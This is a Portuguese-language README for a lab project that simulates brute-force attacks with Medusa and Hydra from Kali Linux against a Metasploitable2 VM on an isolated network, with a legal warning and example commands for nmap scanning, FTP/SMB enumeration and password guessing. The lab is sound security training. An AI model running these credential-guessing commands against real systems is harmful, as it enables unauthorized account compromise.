# Medusa-kali-metasp
Laboratório: ataque de brute-force com Medusa(Kali + Metasploitable2)
# Simulação de Ataques de Força Bruta com Kali + Medusa

**Autor:** Seu Nome  
**Ambiente:** VirtualBox — Kali Linux (atacante) e Metasploitable2 (alvo) em rede host-only  
**Data:** 2025-10-03

## Resumo
Laboratório prático simulando ataques de força bruta em serviços comuns (FTP, SMB, Web) usando Kali Linux e **Medusa**. O objetivo é aprender técnicas de auditoria controlada, documentar as ações e propor mitigações.

> **Aviso legal:** Todos os testes foram executados em VMs isoladas e controladas (metasploitable). Não execute ataques contra sistemas sem autorização.

---

## Arquitetura do laboratório
- VirtualBox:
  - Kali Linux (atacante)
  - Metasploitable2 (alvo)
- Rede: Host-only (isolada do resto da rede)
- Fazer snapshot das VMs antes de começar

---

## Ferramentas utilizadas
- Kali Linux
- Nmap
- Medusa (brute-force)
- Hydra (alternativa)
- enum4linux
- nc / ftp (testes manuais)
- fsck / mount (recuperação de filesystem)

---

## Wordlists incluídas
- `users.txt` — lista de usuários de teste
- `pass.txt` — lista de senhas de teste

(As wordlists são intencionais e simples para fins didáticos.)

---

## Comandos executados (exemplos)
```bash
# Reconhecimento e descoberta
nmap -sV -p 21,22,80,139,445 192.168.56.101 -oN nmap_scan.txt

# Teste manual de FTP
ftp 192.168.56.101
# ou
nc 192.168.56.101 21

# Medusa - brute force FTP (arquivo de usuários e senhas)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 > medusa_out.txt

# Hydra (alternativa)
hydra -L users.txt -P pass.txt ftp://192.168.56.101 -t 6

# Enumeração SMB
enum4linux -a 192.168.56.101 > enum4linux_out.txt

# Caso de erro de filesystem (no alvo) — exemplo de recuperação (em modo manutenção):
fsck -f /dev/mapper/metasploitable-root
